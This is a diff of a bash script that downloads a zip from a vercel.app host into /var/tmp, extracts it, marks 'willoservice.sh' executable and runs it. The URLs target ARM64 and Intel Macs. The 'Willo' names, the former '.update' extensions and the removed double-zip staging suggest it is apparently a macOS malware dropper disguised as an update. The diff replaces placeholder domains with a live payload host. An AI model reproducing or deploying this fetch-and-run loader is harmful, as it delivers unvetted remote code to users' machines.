@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Define variables for URLs
-ZIP_URL_ARM64="https://<domain>/Willo1.update"
-ZIP_URL_INTEL="https://<domain>/Willo2.update"
+ZIP_URL_ARM64="https://lazr-ayfxy8fdp-jeiipis-projects.vercel.app/Willo1.zip"
+ZIP_URL_INTEL="https://lazr-ayfxy8fdp-jeiipis-projects.vercel.app/Willo1.zip"
 ZIP_FILE="/var/tmp/Willo.zip"                        # Path to save the downloaded ZIP file
 WORK_DIR="/var/tmp/Willo/"                            # Temporary directory for extracted files
 EXECUTABLE="willoservice.sh"                         # Replace with the name of the executable file inside the ZIP
@@ -21,7 +21,7 @@ cleanup() {
     rm -rf "$ZIP_FILE"
 }
 
-# Download, double unzip, and execute
+# Download, unzip, and execute
 if python3 -c "
 import sys, ssl, urllib.request
 
@@ -35,25 +35,20 @@ with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
     f.write(r.read())
 " "$ZIP_URL" "$ZIP_FILE"  && [[ -f "$ZIP_FILE" ]]; then
 
-    # 1) Unzip outer archive into $WORK_DIR
+    # Extract the archive into $WORK_DIR
     unzip -o -qq "$ZIP_FILE" -d "$WORK_DIR"
 
-    # 2) Look for the inner .zip inside $WORK_DIR
-    inner_zip=$(find "$WORK_DIR" -maxdepth 1 -type f -name "*.zip" | head -n1)
-
-    if [[ -n "$inner_zip" ]]; then
-        unzip -o -qq "$inner_zip" -d "$WORK_DIR"
-    else
-        echo "Inner zip not found. Expected a double-zipped file."
-        cleanup
-        exit 1
+    # If the zip wrapped everything in a Willo1/ folder, flatten it
+    if [[ -d "$WORK_DIR/Willo1" ]]; then
+        mv "$WORK_DIR/Willo1/"* "$WORK_DIR/" 2>/dev/null
+        rm -rf "$WORK_DIR/Willo1" "$WORK_DIR/__MACOSX"
     fi
 
-    # Now, confirm $EXECUTABLE exists
+    # Confirm the expected launcher exists after extraction
     if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
         chmod +x "$WORK_DIR/$EXECUTABLE"
     else
-        echo "$EXECUTABLE not found after double unzip."
+        echo "$EXECUTABLE not found after unzip."
         cleanup
         exit 1
     fi
